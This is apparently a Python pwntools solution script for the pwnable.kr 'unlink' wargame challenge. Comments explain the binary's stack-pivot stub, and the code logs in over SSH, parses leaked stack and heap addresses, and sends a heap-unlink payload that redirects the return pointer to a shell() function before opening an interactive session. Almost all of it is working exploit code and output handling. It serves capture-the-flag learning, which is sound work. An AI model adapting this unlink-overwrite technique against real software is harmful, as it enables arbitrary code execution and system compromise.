from pwn import *

'''
object 0x18
    |   4   |   4   |   4   |   4   |
0x00|  fd   |  bk   |      buf      |
0x10|       x       |
'''

###Addr
shell_addr = 0x80484eb


###Exploit
###The basic idea in overwriting return address with shell() address using unlink
###However, directly doing so would cause some write in shell() code, and cause segfault
###So the problem inserted some stub into binary to make problem solvable
'''
 804852f: 8d 4c 24 04          	lea    ecx,[esp+0x4]            ***
 8048533: 83 e4 f0             	and    esp,0xfffffff0
 8048536: ff 71 fc             	push   DWORD PTR [ecx-0x4]      ***
 8048539: 55                   	push   ebp
 804853a: 89 e5                	mov    ebp,esp
 804853c: 51                   	push   ecx                      ***
 ...
 80485f2: e8 0d ff ff ff       	call   8048504 <unlink>
 80485f7: 83 c4 10             	add    esp,0x10
 80485fa: b8 00 00 00 00       	mov    eax,0x0
 80485ff: 8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]  ***
 8048602: c9                   	leave  
 8048603: 8d 61 fc             	lea    esp,[ecx-0x4]            ***
 8048606: c3                   	ret

The starred lines are the unusual ones
What it does is basically storing a pointer to the return address at ebp-0x4
And dereferencing it twice to get return address upon leaving main

Given this, we can sabotage the pointer at ebp-0x4 and hijack return address
'''
s = ssh(host='pwnable.kr', port=2222,
        user='unlink',
        password='guest')
r = s.process(["./unlink"])
leaks = r.recvuntil('get shell!\n').decode().split('\n')
stack_addr = int(leaks[0].split('0x')[1],16)
heap_addr = int(leaks[1].split('0x')[1],16)
r.sendline(p32(shell_addr)+b'a'*12+p32(heap_addr+0xc)+p32(stack_addr+0x10))
r.interactive(prompt='')
